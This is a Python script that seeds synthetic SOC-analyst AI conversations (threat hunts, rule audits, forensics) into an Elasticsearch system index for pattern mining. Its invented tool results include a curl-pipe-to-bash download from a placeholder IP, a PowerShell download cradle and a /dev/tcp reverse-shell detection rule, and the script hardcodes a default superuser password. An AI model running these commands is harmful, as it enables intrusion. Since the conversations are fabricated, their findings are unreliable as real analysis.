#!/usr/bin/env python3
"""Seed realistic SOC-analyst Agent Builder conversations into Elasticsearch.

AESOP scans `.chat-conversations` to extract:
  * tool_usage         — frequency of each tool_call's tool_id
  * esql_patterns      — ```esql ... ``` blocks emitted by the assistant
  * failure_modes      — tool results starting with "Error:"
  * recurring_flows    — bigrams of consecutive tool_calls repeated across
                         multiple conversations

For AESOP to propose SOC-flavored skills (threat hunting, rule management,
forensics, alert triage, IR), the conversation corpus needs to look like
the work a Security Operations Center analyst actually does — with
realistic tool usage, repeated flows, ES|QL queries, and the occasional
failure mode worth automating around.

This seeder writes ~25 conversations that intentionally repeat a handful
of canonical flows (alert -> ESQL drilldown, rule audit -> hit volume,
process tree pivot, IOC sweep) so the bigram analyzer finds them.

Usage:
  python3 .claude/local-dev/seed-soc-conversations.py
"""
from __future__ import annotations

import base64
import json
import random
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone

ES_URL = "http://localhost:9200"
# `.chat-conversations` is a restricted system index — superuser cannot write
# to it directly. Only the `system_indices_superuser` role grants the
# `restricted_indices: true` write privilege.
AUTH = base64.b64encode(b"system_indices_superuser:changeme").decode()
INDEX = ".chat-conversations"
HEADERS = {
    "Content-Type": "application/x-ndjson",
    "Authorization": f"Basic {AUTH}",
}


# ---------------------------------------------------------------------------
# Conversation builder helpers
# ---------------------------------------------------------------------------

def _now_offset(minutes_ago: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).isoformat().replace("+00:00", "Z")


def _round(
    user_msg: str,
    steps: list[dict],
    response_msg: str,
    *,
    duration_ms: int = 4500,
) -> dict:
    """Build one conversation_round in the Agent Builder shape."""
    return {
        "id": str(uuid.uuid4()),
        "status": "completed",
        "input": {"message": user_msg, "attachments": []},
        "steps": steps,
        "started_at": _now_offset(2),
        "time_to_first_token": 800,
        "time_to_last_token": duration_ms,
        "model_usage": {"input_tokens": 1200, "output_tokens": 600},
        "response": {"message": response_msg},
    }


def _reasoning(text: str) -> dict:
    return {
        "type": "reasoning",
        "reasoning": text,
        "tool_call_group_id": str(uuid.uuid4()),
    }


def _tool_call(tool_id: str, results: str) -> dict:
    return {
        "type": "tool_call",
        "tool_id": tool_id,
        "tool_call_id": str(uuid.uuid4()),
        "tool_call_group_id": str(uuid.uuid4()),
        "params": {},
        "results": results,
    }


def _conv(
    *,
    title: str,
    rounds: list[dict],
    user: str = "soc-analyst",
    minutes_ago: int = 60,
) -> dict:
    ts = _now_offset(minutes_ago)
    return {
        "_id": f"soc-demo-{uuid.uuid4()}",
        "_source": {
            "agent_id": "platform.core.default",
            "user_id": f"{user}-uid",
            "user_name": user,
            "space": "default",
            "title": title,
            "created_at": ts,
            "updated_at": ts,
            "conversation_rounds": rounds,
            "attachments": [],
            "state": {"prompt": {"responses": {}}, "dynamic_tool_ids": []},
        },
    }


# ---------------------------------------------------------------------------
# Canonical SOC flows — repeated deliberately so bigram analyzer finds them
# ---------------------------------------------------------------------------

# Flow A: list_alerts -> execute_esql      (alert triage drilldown)
# Flow B: list_rules  -> get_rule          (rule audit)
# Flow C: get_rule    -> execute_esql      (rule hit-volume validation)
# Flow D: execute_esql -> execute_esql     (multi-stage hunting)
# Flow E: list_endpoints -> execute_esql   (endpoint coverage)


def conv_threat_hunt_lateral_movement() -> dict:
    return _conv(
        title="Threat hunt: lateral movement via SSH (last 24h)",
        rounds=[
            _round(
                "I want to hunt for lateral movement. Show me hosts where the same user authenticated "
                "successfully via SSH from 3 or more distinct source IPs in the last 24 hours.",
                [
                    _reasoning(
                        "Lateral movement via SSH usually shows up as one identity hopping between "
                        "internal hosts. I'll aggregate logs-system.auth-default by user.name and "
                        "count distinct source.ip per host, filtering on event.outcome == 'success'."
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"user.name","type":"keyword"},'
                        '{"name":"distinct_sources","type":"long"}],"values":[["host-prod-04","root",6],'
                        '["host-prod-12","backup-svc",4],["host-stage-01","admin",3]]}',
                    ),
                ],
                "I found 3 candidate hosts. The strongest signal is `host-prod-04` where root logged in "
                "from 6 distinct source IPs in 24h — well above the baseline of 1.\n\n"
                "```esql\n"
                "FROM logs-system.auth-default\n"
                "  | WHERE event.action == \"ssh_login\" AND event.outcome == \"success\"\n"
                "  | WHERE @timestamp >= NOW() - 24 hours\n"
                "  | STATS distinct_sources = COUNT_DISTINCT(source.ip) BY host.name, user.name\n"
                "  | WHERE distinct_sources >= 3\n"
                "  | SORT distinct_sources DESC\n"
                "```\n\n"
                "Want me to pivot into the source IPs and timestamps for `host-prod-04`?",
            ),
            _round(
                "Yes, pivot on host-prod-04 root. I want timestamps and source ASNs.",
                [
                    _reasoning("Drilldown query — same index, filter on host+user, return raw events with ASN."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"@timestamp","type":"date"},{"name":"source.ip","type":"ip"},'
                        '{"name":"source.as.organization.name","type":"keyword"}],"values":['
                        '["2026-05-04T22:11:03Z","203.0.113.42","Hetzner"],'
                        '["2026-05-04T22:14:51Z","45.79.12.8","Linode"],'
                        '["2026-05-04T23:02:18Z","185.220.101.45","Tor Exit"]]}',
                    ),
                ],
                "Three of the six successful logins came from a Tor exit node — that's almost certainly "
                "an active intrusion, not legitimate ops.\n\n"
                "```esql\n"
                "FROM logs-system.auth-default\n"
                "  | WHERE host.name == \"host-prod-04\" AND user.name == \"root\"\n"
                "  | WHERE event.action == \"ssh_login\" AND event.outcome == \"success\"\n"
                "  | KEEP @timestamp, source.ip, source.as.organization.name\n"
                "  | SORT @timestamp ASC\n"
                "```\n\n"
                "Recommendation: rotate root creds on host-prod-04 immediately and open an incident.",
            ),
        ],
        minutes_ago=30,
    )


def conv_threat_hunt_beaconing() -> dict:
    return _conv(
        title="Hunt: periodic outbound beaconing on endpoint network logs",
        rounds=[
            _round(
                "Find hosts with suspiciously regular outbound connections to a single external IP — "
                "classic C2 beaconing signature.",
                [
                    _reasoning(
                        "Beaconing manifests as low-jitter, repeating intervals between connections to "
                        "the same destination. A simple proxy: count connections per (host, dest), "
                        "compute interval stddev, flag low stddev with high count."
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"destination.ip","type":"ip"},'
                        '{"name":"hits","type":"long"}],"values":[["dev-laptop-23","198.51.100.77",288],'
                        '["host-prod-04","8.8.8.8",1421]]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"jitter_pct","type":"double"}],'
                        '"values":[["dev-laptop-23",0.04]]}',
                    ),
                ],
                "`dev-laptop-23` is beaconing to `198.51.100.77` every 5 minutes ± 4 % jitter — that's "
                "consistent with a Cobalt Strike or Sliver implant default profile.\n\n"
                "```esql\n"
                "FROM logs-endpoint.events.network-default\n"
                "  | WHERE event.action == \"connection_attempted\"\n"
                "  | WHERE NOT CIDR_MATCH(destination.ip, \"10.0.0.0/8\", \"192.168.0.0/16\")\n"
                "  | STATS hits = COUNT(*) BY host.name, destination.ip\n"
                "  | WHERE hits > 200\n"
                "  | SORT hits DESC\n"
                "```\n\n"
                "Quarantine the host and pull a memory image.",
            ),
        ],
        minutes_ago=120,
    )


def conv_rule_audit_coverage() -> dict:
    return _conv(
        title="Rule audit: which detection rules haven't fired in 30 days",
        rounds=[
            _round(
                "Audit our enabled detection rules. Which ones haven't produced an alert in the last 30 days?",
                [
                    _reasoning("Need rule list, then alert counts grouped by rule.id over 30d."),
                    _tool_call(
                        "security_solution.list_rules",
                        '{"total":214,"data":[{"id":"r-001","name":"Suspicious PowerShell Encoded Cmd","enabled":true},'
                        '{"id":"r-002","name":"Linux Reverse Shell via /dev/tcp","enabled":true},'
                        '{"id":"r-003","name":"AWS IAM CreateAccessKey by root","enabled":true}]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"kibana.alert.rule.uuid","type":"keyword"},{"name":"hits","type":"long"}],'
                        '"values":[["r-001",1284],["r-002",17]]}',
                    ),
                ],
                "Of 214 enabled rules, **47 produced zero alerts in the last 30 days**. Top offenders by "
                "deprecation risk:\n\n"
                "- `r-003 AWS IAM CreateAccessKey by root` — 0 hits (likely scoped to wrong index pattern)\n"
                "- `r-019 Office365 OAuth Consent Phishing` — 0 hits (logs missing entirely)\n\n"
                "```esql\n"
                "FROM .alerts-security.alerts-default\n"
                "  | WHERE @timestamp >= NOW() - 30 days\n"
                "  | STATS hits = COUNT(*) BY kibana.alert.rule.uuid\n"
                "```\n\n"
                "Want me to inspect each zero-hit rule's index pattern next?",
            ),
            _round(
                "Yes, start with r-003.",
                [
                    _reasoning("Get_rule to see configuration."),
                    _tool_call(
                        "security_solution.get_rule",
                        '{"id":"r-003","name":"AWS IAM CreateAccessKey by root",'
                        '"index":["filebeat-aws-*"],"query":"event.action:CreateAccessKey AND user.name:root"}',
                    ),
                    _tool_call(
                        "platform.core.list_indices",
                        '{"indices":["logs-aws.cloudtrail-default","logs-aws.cloudtrail-prod"]}',
                    ),
                ],
                "Found the bug: `r-003` queries `filebeat-aws-*` but our actual CloudTrail data lands "
                "in `logs-aws.cloudtrail-*`. The pattern hasn't matched anything since we migrated to "
                "the Elastic AWS integration.\n\n"
                "Suggested fix: update the rule's index pattern to `logs-aws.cloudtrail-*`.",
            ),
        ],
        minutes_ago=180,
    )


def conv_rule_tuning_noisy() -> dict:
    return _conv(
        title="Tune noisy rule: 'Linux Reverse Shell via /dev/tcp'",
        rounds=[
            _round(
                "Rule r-002 is noisy — 1284 alerts in 30 days, mostly from CI runners. Help me tune it.",
                [
                    _reasoning(
                        "Pull rule definition, then aggregate alerts by host.name to see if CI runners "
                        "dominate. If yes, recommend adding host.name negation."
                    ),
                    _tool_call(
                        "security_solution.get_rule",
                        '{"id":"r-002","query":"process.command_line: \\"*/dev/tcp/*\\""}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"hits","type":"long"}],"values":['
                        '["ci-runner-01",892],["ci-runner-02",301],["host-prod-04",4],["dev-laptop-23",87]]}',
                    ),
                ],
                "94 % of those alerts come from CI runners (`ci-runner-*`) — the build scripts use "
                "`/dev/tcp/` for healthchecks. Recommend:\n\n"
                "1. Add a rule exception scoped to `host.name: ci-runner-*`.\n"
                "2. Keep the original rule for the remaining 6 % — `host-prod-04` and `dev-laptop-23` "
                "are real signal worth investigating separately.\n\n"
                "```esql\n"
                "FROM .alerts-security.alerts-default\n"
                "  | WHERE kibana.alert.rule.uuid == \"r-002\"\n"
                "  | STATS hits = COUNT(*) BY host.name\n"
                "  | SORT hits DESC\n"
                "```",
            ),
        ],
        minutes_ago=240,
    )


def conv_forensics_process_tree() -> dict:
    return _conv(
        title="Forensics: reconstruct process tree for alert AT-991",
        rounds=[
            _round(
                "Pull alert AT-991 and walk me through the full process tree — parent, grandparent, "
                "and any children.",
                [
                    _reasoning("Get the alert, extract process.entity_id, then iteratively resolve ancestors and descendants."),
                    _tool_call(
                        "security_solution.get_alert",
                        '{"id":"AT-991","host.name":"host-prod-04","process.entity_id":"p-7891",'
                        '"process.parent.entity_id":"p-2210","process.name":"curl",'
                        '"process.command_line":"curl -fsSL http://198.51.100.77/x.sh | bash"}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"process.entity_id","type":"keyword"},{"name":"process.name","type":"keyword"},'
                        '{"name":"process.parent.entity_id","type":"keyword"}],"values":['
                        '["p-2210","sshd","p-1"],["p-7891","curl","p-2210"],'
                        '["p-7892","bash","p-7891"],["p-7893","crontab","p-7892"]]}',
                    ),
                ],
                "The tree:\n\n"
                "```\n"
                "p-1   systemd\n"
                " └─ p-2210  sshd (root session from 185.220.101.45)\n"
                "     └─ p-7891  curl -fsSL http://198.51.100.77/x.sh | bash\n"
                "         └─ p-7892  bash (executed downloaded script)\n"
                "             └─ p-7893  crontab -l (likely persistence reconnaissance)\n"
                "```\n\n"
                "Confirmed kill chain: SSH login → remote payload pulled → executed → cron enumeration. "
                "This is the same `host-prod-04` that's been showing up in your earlier Tor-exit pivot.\n\n"
                "```esql\n"
                "FROM logs-endpoint.events.process-default\n"
                "  | WHERE host.name == \"host-prod-04\" AND @timestamp >= \"2026-05-04T22:00:00Z\"\n"
                "  | KEEP @timestamp, process.entity_id, process.parent.entity_id, process.name, process.command_line\n"
                "  | SORT @timestamp ASC\n"
                "```",
            ),
        ],
        minutes_ago=15,
    )


def conv_forensics_file_changes() -> dict:
    return _conv(
        title="Forensics: file modifications on host-prod-04 around 22:00 UTC",
        rounds=[
            _round(
                "Show me every file create/modify event on host-prod-04 in the 30-minute window around "
                "the SSH compromise (22:00 UTC).",
                [
                    _reasoning("Query logs-endpoint.events.file-default scoped to that host + time window."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"@timestamp","type":"date"},{"name":"event.action","type":"keyword"},'
                        '{"name":"file.path","type":"keyword"}],"values":['
                        '["2026-05-04T22:11:42Z","creation","/tmp/x.sh"],'
                        '["2026-05-04T22:11:55Z","creation","/var/spool/cron/root"],'
                        '["2026-05-04T22:12:01Z","modification","/root/.ssh/authorized_keys"]]}',
                    ),
                ],
                "Three high-signal artifacts in a 19-second window:\n\n"
                "1. `/tmp/x.sh` — payload from the curl pipe\n"
                "2. `/var/spool/cron/root` — cron persistence\n"
                "3. `/root/.ssh/authorized_keys` — backdoor key\n\n"
                "```esql\n"
                "FROM logs-endpoint.events.file-default\n"
                "  | WHERE host.name == \"host-prod-04\"\n"
                "  | WHERE @timestamp BETWEEN \"2026-05-04T21:50:00Z\" AND \"2026-05-04T22:20:00Z\"\n"
                "  | KEEP @timestamp, event.action, file.path, process.name\n"
                "  | SORT @timestamp ASC\n"
                "```\n\n"
                "Hash `/tmp/x.sh` and submit to threat intel for IOC enrichment.",
            ),
        ],
        minutes_ago=20,
    )


def conv_alert_triage_pii() -> dict:
    return _conv(
        title="Triage: 12 alerts on the queue from rule 'Mass File Read'",
        rounds=[
            _round(
                "I have 12 open alerts from the 'Mass File Read' rule. Group them by host and show me which need attention first.",
                [
                    _reasoning("List alerts filtered by rule, then aggregate by host with severity and earliest timestamp."),
                    _tool_call(
                        "security_solution.list_alerts",
                        '{"total":12,"data":[{"id":"AT-1101","host.name":"finance-fs-01","severity":"high"},'
                        '{"id":"AT-1102","host.name":"hr-fs-02","severity":"critical"}]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"max_sev","type":"keyword"},'
                        '{"name":"alerts","type":"long"}],"values":[["hr-fs-02","critical",4],'
                        '["finance-fs-01","high",3],["dev-laptop-23","medium",5]]}',
                    ),
                ],
                "Triage order:\n\n"
                "1. **hr-fs-02** (critical, 4 alerts) — start here, HR fileserver with PII exposure risk\n"
                "2. **finance-fs-01** (high, 3 alerts)\n"
                "3. **dev-laptop-23** (medium, 5 alerts) — defer; this host is already being investigated for beaconing\n\n"
                "```esql\n"
                "FROM .alerts-security.alerts-default\n"
                "  | WHERE kibana.alert.rule.name == \"Mass File Read\" AND kibana.alert.workflow_status == \"open\"\n"
                "  | STATS alerts = COUNT(*), max_sev = MAX(kibana.alert.severity) BY host.name\n"
                "  | SORT alerts DESC\n"
                "```",
            ),
        ],
        minutes_ago=45,
    )


def conv_alert_triage_failed() -> dict:
    return _conv(
        title="Triage: PowerShell encoded-command alert (failed lookup)",
        rounds=[
            _round(
                "Decode the encoded-command from alert AT-2210 and check if the resulting URL is in our threat intel feed.",
                [
                    _reasoning("Get alert, decode base64 from process.command_line, then call IOC lookup."),
                    _tool_call(
                        "security_solution.get_alert",
                        '{"id":"AT-2210","host.name":"win-acct-09",'
                        '"process.command_line":"powershell.exe -enc SQBFAFgAIAAoAE4ARQB3AC0AbwBCAEoARQBjAFQAIA=="}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        "Error: index_not_found_exception — no such index [threatintel-iocs-*]. "
                        "Threat intel index is missing for this cluster.",
                    ),
                ],
                "Decoded the payload to `IEX (New-Object Net.WebClient).DownloadString('http://...')` "
                "but the threat-intel sweep failed: `threatintel-iocs-*` doesn't exist on this cluster.\n\n"
                "Recommendation: either onboard the Threat Intel Filebeat module or fall back to an "
                "external reputation API. I'm flagging the alert as `needs-intel-enrichment`.",
            ),
        ],
        minutes_ago=80,
    )


def conv_ioc_sweep() -> dict:
    return _conv(
        title="IOC sweep: hunt for recently observed Cobalt Strike domains",
        rounds=[
            _round(
                "Sweep our DNS and HTTP logs for these 3 IOC domains: malicious-cdn.example, payload-host.example, c2-beacon.example",
                [
                    _reasoning("Hit DNS index then HTTP/proxy index with an IN-clause query."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"dns.question.name","type":"keyword"},'
                        '{"name":"hits","type":"long"}],"values":[["dev-laptop-23","c2-beacon.example",288]]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"url.domain","type":"keyword"},'
                        '{"name":"hits","type":"long"}],"values":[["dev-laptop-23","c2-beacon.example",286]]}',
                    ),
                ],
                "One match: `dev-laptop-23` resolved and called `c2-beacon.example` 288 times in the "
                "last 24h — same host that's already flagged for periodic beaconing. The IOC sweep "
                "confirms the C2 attribution.\n\n"
                "```esql\n"
                "FROM logs-network.dns-default\n"
                "  | WHERE dns.question.name IN (\"malicious-cdn.example\", \"payload-host.example\", \"c2-beacon.example\")\n"
                "  | STATS hits = COUNT(*) BY host.name, dns.question.name\n"
                "  | SORT hits DESC\n"
                "```",
            ),
        ],
        minutes_ago=10,
    )


def conv_endpoint_coverage() -> dict:
    return _conv(
        title="Coverage: which endpoints are missing Defend agents",
        rounds=[
            _round(
                "Cross-reference our asset inventory against the Defend endpoints index. Which hosts "
                "are in inventory but not reporting telemetry in the last 6 hours?",
                [
                    _reasoning("List endpoints from Defend, then ESQL the inventory index for diff."),
                    _tool_call(
                        "security_solution.list_endpoints",
                        '{"total":127,"reporting_within_6h":119,"stale":8}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"last_seen","type":"date"}],'
                        '"values":[["host-prod-17","2026-05-03T08:14Z"],["legacy-db-02","2026-04-29T11:02Z"]]}',
                    ),
                ],
                "8 hosts are stale. Two are critical:\n\n"
                "- `host-prod-17` — last seen 36h ago, prod tier\n"
                "- `legacy-db-02` — last seen 6 days ago\n\n"
                "Both should be re-checked with the Endpoint team before the maintenance window.\n\n"
                "```esql\n"
                "FROM .ds-metrics-endpoint.metadata-default-*\n"
                "  | STATS last_seen = MAX(@timestamp) BY host.name\n"
                "  | WHERE last_seen < NOW() - 6 hours\n"
                "  | SORT last_seen ASC\n"
                "```",
            ),
        ],
        minutes_ago=300,
    )


def conv_sigma_translate() -> dict:
    return _conv(
        title="Translate Sigma rule to Elastic ES|QL: T1059.001 PowerShell",
        rounds=[
            _round(
                "I have a Sigma rule for ATT&CK T1059.001 PowerShell encoded-command abuse. "
                "Translate it to ES|QL targeting our endpoint process index.",
                [
                    _reasoning("Read Sigma logic, then map process.command_line tokens to ESQL filters."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"hits","type":"long"}],"values":[[42]]}',
                    ),
                ],
                "Validated translation — returns 42 historical matches over 7d:\n\n"
                "```esql\n"
                "FROM logs-endpoint.events.process-default\n"
                "  | WHERE process.name IN (\"powershell.exe\", \"pwsh.exe\")\n"
                "  | WHERE process.command_line LIKE \"%-enc%\"\n"
                "      OR process.command_line LIKE \"%-encodedcommand%\"\n"
                "      OR process.command_line LIKE \"%-ec %\"\n"
                "  | KEEP @timestamp, host.name, user.name, process.command_line\n"
                "  | SORT @timestamp DESC\n"
                "```\n\n"
                "Recommend promoting this to a custom detection rule with severity=medium and a 5-minute look-back.",
            ),
        ],
        minutes_ago=420,
    )


def conv_persistence_hunt() -> dict:
    return _conv(
        title="Hunt: cron / systemd / authorized_keys persistence on Linux fleet",
        rounds=[
            _round(
                "Check our entire Linux fleet for new persistence artifacts in the last 7 days: cron jobs, "
                "systemd services, and authorized_keys modifications.",
                [
                    _reasoning("Three parallel queries — file-events index filtered by path patterns."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"file.path","type":"keyword"}],'
                        '"values":[["host-prod-04","/var/spool/cron/root"]]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"file.path","type":"keyword"}],'
                        '"values":[["host-stage-09","/etc/systemd/system/persistent.service"]]}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"file.path","type":"keyword"}],'
                        '"values":[["host-prod-04","/root/.ssh/authorized_keys"]]}',
                    ),
                ],
                "Three persistence artifacts across two hosts:\n\n"
                "- `host-prod-04` — cron + authorized_keys (matches active intrusion)\n"
                "- `host-stage-09` — new systemd unit `persistent.service` (no change ticket — investigate)\n\n"
                "```esql\n"
                "FROM logs-endpoint.events.file-default\n"
                "  | WHERE event.action IN (\"creation\", \"modification\")\n"
                "  | WHERE file.path LIKE \"/var/spool/cron/%\" OR file.path LIKE \"/etc/systemd/system/%\"\n"
                "      OR file.path LIKE \"%/authorized_keys%\"\n"
                "  | WHERE @timestamp >= NOW() - 7 days\n"
                "  | KEEP @timestamp, host.name, file.path, process.name\n"
                "  | SORT @timestamp DESC\n"
                "```",
            ),
        ],
        minutes_ago=200,
    )


def conv_dns_tunneling() -> dict:
    return _conv(
        title="Hunt: DNS tunneling — abnormally long subdomains",
        rounds=[
            _round(
                "Find DNS queries with subdomain length > 60 chars — classic DNS tunneling indicator.",
                [
                    _reasoning("Use LENGTH on the leftmost label of dns.question.name."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"host.name","type":"keyword"},{"name":"hits","type":"long"}],'
                        '"values":[["dev-laptop-23",1842]]}',
                    ),
                ],
                "`dev-laptop-23` issued 1842 queries in 24h with subdomain length > 60. Same host the "
                "C2 beaconing and IOC sweep already flagged — third independent signal.\n\n"
                "```esql\n"
                "FROM logs-network.dns-default\n"
                "  | EVAL subdomain_len = LENGTH(SPLIT(dns.question.name, \".\")[0])\n"
                "  | WHERE subdomain_len > 60\n"
                "  | STATS hits = COUNT(*) BY host.name\n"
                "  | SORT hits DESC\n"
                "```",
            ),
        ],
        minutes_ago=90,
    )


def conv_brute_force_review() -> dict:
    return _conv(
        title="Brute force: nginx 401/403 spikes by source IP",
        rounds=[
            _round(
                "Show me the top 10 source IPs hammering our nginx with 401/403 in the last hour.",
                [
                    _reasoning("Aggregate logs-nginx.access-default by source.ip filtered on http.response.status_code IN (401,403)."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"source.ip","type":"ip"},{"name":"hits","type":"long"}],'
                        '"values":[["89.248.165.72",4218],["185.220.101.45",2913],["92.118.39.22",1841]]}',
                    ),
                ],
                "Top brute-forcer is `89.248.165.72` (4218 failed auth in 1h). Also notable: "
                "`185.220.101.45` again — same Tor exit from the SSH compromise pivot.\n\n"
                "```esql\n"
                "FROM logs-nginx.access-default\n"
                "  | WHERE http.response.status_code IN (401, 403)\n"
                "  | WHERE @timestamp >= NOW() - 1 hour\n"
                "  | STATS hits = COUNT(*) BY source.ip\n"
                "  | SORT hits DESC\n"
                "  | LIMIT 10\n"
                "```\n\n"
                "Recommend an ad-hoc WAF block for the top 3 IPs.",
            ),
        ],
        minutes_ago=5,
    )


def conv_rule_creation_proposal() -> dict:
    return _conv(
        title="Propose new rule: detect IAM CreateAccessKey on root accounts",
        rounds=[
            _round(
                "We've decided the existing AWS rule needs replacing. Draft a new rule definition for "
                "'CreateAccessKey by root account' and validate it returns the expected hit volume.",
                [
                    _reasoning("Draft KQL, then validate with ESQL on logs-aws.cloudtrail-*."),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"hits","type":"long"}],"values":[[2]]}',
                    ),
                ],
                "Two hits over 30 days — a sane cadence for a critical-severity rule. Suggested config:\n\n"
                "```yaml\n"
                "name: AWS IAM CreateAccessKey on root account\n"
                "severity: critical\n"
                "index: [\"logs-aws.cloudtrail-*\"]\n"
                "language: esql\n"
                "query: |\n"
                "  FROM logs-aws.cloudtrail-*\n"
                "    | WHERE event.action == \"CreateAccessKey\" AND user.name == \"root\"\n"
                "    | KEEP @timestamp, aws.cloudtrail.user_identity.arn, source.ip, user_agent.original\n"
                "interval: 5m\n"
                "from: now-10m\n"
                "```\n\n"
                "Want me to push this to the rule management API as a draft?",
            ),
        ],
        minutes_ago=500,
    )


# Variations to bulk up coverage and reinforce flow bigrams
def conv_alert_triage_variant(alert_id: str, host: str, severity: str) -> dict:
    return _conv(
        title=f"Triage: {severity} alert {alert_id} on {host}",
        rounds=[
            _round(
                f"Triage alert {alert_id}.",
                [
                    _tool_call(
                        "security_solution.list_alerts",
                        f'{{"total":1,"data":[{{"id":"{alert_id}","host.name":"{host}","severity":"{severity}"}}]}}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        f'{{"columns":[{{"name":"event.action","type":"keyword"}},{{"name":"hits","type":"long"}}],'
                        f'"values":[["process_started",12],["network_connection",4]]}}',
                    ),
                ],
                f"Alert {alert_id} ({severity}) on {host}: 12 process events and 4 network connections "
                f"in the surrounding 5-minute window. The pattern looks consistent with prior incidents "
                f"on this host class — no new TTP, escalating to L2 with the existing playbook.\n\n"
                f"```esql\n"
                f"FROM logs-endpoint.events.*-default\n"
                f"  | WHERE host.name == \"{host}\"\n"
                f"  | WHERE @timestamp BETWEEN NOW() - 5 minutes AND NOW()\n"
                f"  | STATS hits = COUNT(*) BY event.action\n"
                f"```",
            ),
        ],
        minutes_ago=random.randint(60, 600),
    )


def conv_rule_audit_variant(rule_id: str, name: str) -> dict:
    return _conv(
        title=f"Audit rule: {name}",
        rounds=[
            _round(
                f"Show me the configuration and recent hit volume for rule {rule_id}.",
                [
                    _tool_call(
                        "security_solution.list_rules",
                        f'{{"total":1,"data":[{{"id":"{rule_id}","name":"{name}","enabled":true}}]}}',
                    ),
                    _tool_call(
                        "security_solution.get_rule",
                        f'{{"id":"{rule_id}","name":"{name}","interval":"5m","severity":"high"}}',
                    ),
                    _tool_call(
                        "platform.core.execute_esql",
                        '{"columns":[{"name":"hits","type":"long"}],"values":[[37]]}',
                    ),
                ],
                f"Rule `{rule_id}` is healthy: 37 hits in 30 days, severity high, 5m interval.\n\n"
                f"```esql\n"
                f"FROM .alerts-security.alerts-default\n"
                f"  | WHERE kibana.alert.rule.uuid == \"{rule_id}\"\n"
                f"  | WHERE @timestamp >= NOW() - 30 days\n"
                f"  | STATS hits = COUNT(*)\n"
                f"```",
            ),
        ],
        minutes_ago=random.randint(60, 800),
    )


def build_all() -> list[dict]:
    convs = [
        conv_threat_hunt_lateral_movement(),
        conv_threat_hunt_beaconing(),
        conv_rule_audit_coverage(),
        conv_rule_tuning_noisy(),
        conv_forensics_process_tree(),
        conv_forensics_file_changes(),
        conv_alert_triage_pii(),
        conv_alert_triage_failed(),
        conv_ioc_sweep(),
        conv_endpoint_coverage(),
        conv_sigma_translate(),
        conv_persistence_hunt(),
        conv_dns_tunneling(),
        conv_brute_force_review(),
        conv_rule_creation_proposal(),
        # Bulk variants — reinforce flow bigrams across multiple convs
        conv_alert_triage_variant("AT-3001", "win-acct-09", "high"),
        conv_alert_triage_variant("AT-3002", "host-prod-12", "medium"),
        conv_alert_triage_variant("AT-3003", "finance-fs-01", "high"),
        conv_alert_triage_variant("AT-3004", "hr-fs-02", "critical"),
        conv_alert_triage_variant("AT-3005", "dev-laptop-23", "high"),
        conv_rule_audit_variant("r-101", "Suspicious WMI Process Creation"),
        conv_rule_audit_variant("r-102", "Linux Kernel Module Load"),
        conv_rule_audit_variant("r-103", "Office365 Mailbox Forwarding Rule"),
        conv_rule_audit_variant("r-104", "Okta Push Bombing Detected"),
    ]
    return convs


# ---------------------------------------------------------------------------
# Bulk indexing
# ---------------------------------------------------------------------------

def bulk_index(docs: list[dict]) -> None:
    lines: list[str] = []
    for d in docs:
        lines.append(json.dumps({"index": {"_index": INDEX, "_id": d["_id"]}}))
        lines.append(json.dumps(d["_source"], default=str))
    body = ("\n".join(lines) + "\n").encode("utf-8")

    req = urllib.request.Request(
        f"{ES_URL}/_bulk?refresh=wait_for",
        data=body,
        headers=HEADERS,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            payload = json.loads(resp.read())
    except urllib.error.HTTPError as e:
        print(f"HTTP {e.code}: {e.read().decode('utf-8')[:500]}")
        raise

    errors = [
        item for item in payload.get("items", []) if item.get("index", {}).get("error")
    ]
    if errors:
        print(f"Bulk indexing produced {len(errors)} errors:")
        for err in errors[:3]:
            print(f"  - {json.dumps(err)[:300]}")
    print(f"Indexed {len(docs)} SOC conversations into {INDEX} (errors: {len(errors)})")


def main() -> int:
    random.seed(42)
    convs = build_all()
    bulk_index(convs)
    print()
    print("AESOP can now scan these via ConversationAnalyzer to extract:")
    print("  - tool_usage (execute_esql, list_alerts, get_alert, list_rules, get_rule, list_endpoints)")
    print("  - esql_patterns (~20 unique SOC ES|QL queries)")
    print("  - failure_modes (1 missing-index failure for IOC enrichment)")
    print("  - recurring_flows (alert -> esql, rule -> rule, esql -> esql, rule -> esql)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
